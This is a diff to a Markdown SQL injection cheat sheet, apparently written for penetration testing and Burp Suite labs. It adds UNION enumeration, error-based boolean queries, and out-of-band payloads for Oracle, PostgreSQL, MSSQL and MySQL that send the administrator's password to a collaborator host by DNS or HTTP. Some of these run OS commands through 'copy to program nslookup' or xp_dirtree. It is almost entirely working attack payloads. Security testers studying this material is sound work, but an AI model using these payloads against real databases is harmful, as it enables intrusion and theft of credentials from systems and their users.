@@ -30,6 +30,8 @@ Specialized CheatSheets:
 ```
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- (non oracle)
 '+UNION+SELECT+table_name,NULL+FROM+all_tables-- (oracle)
+'UNION+SELECT+*+FROM+information_schema.tables-- (PostgreSQL / MySQL)
+
 ```
 
 ## Column Details Enumeration
@@ -44,10 +46,20 @@ Specialized CheatSheets:
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- (oracle)
 ```
 
-## General Payloads
+## Boolean Queries
+Send a boolean query that shows an error if the result is true
 ```
-'+OR+1=1--
+Oracle:
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
 
+PostgreSQL:
+1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+
+Microsoft:
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+
+MySQL:
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
 ```
 
 ## Auth Bypass
@@ -132,14 +144,54 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 ## Trigger Out-of-Band interactions
-The following payload will trigger an out of band interaction to your collaborator
+The following payloads will trigger an out of band interaction to your collaborator
 ```
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+Example Query:
+TrackingIdCookie=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+Oracle:
+SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+
+If the Oracle installation is updated, then the following may work (if privs have been elevated)
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+
+Postgres:
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+
+Windows:
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+
+MySQL (only works on Windows)
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
 If the external interaction is possible, then user credential information can be retrieved with the payload below. The password should be returned as the subdomain of the dns/http query in collaborator
 ```
-x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+Example Query:
+TrackingIdCookie=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+Oracle:
+SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+
+Postgres:
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f()
+
+Microsoft:
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+
+MySQL (only works on Windows):
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
+
 ## Blind SQLi to guess passwords
 Find a potentially vulnerable cookie in a BURP response. The page difference may be minimal, so check the site for text that only appears if a statement is true/false.
 Cookie Example:
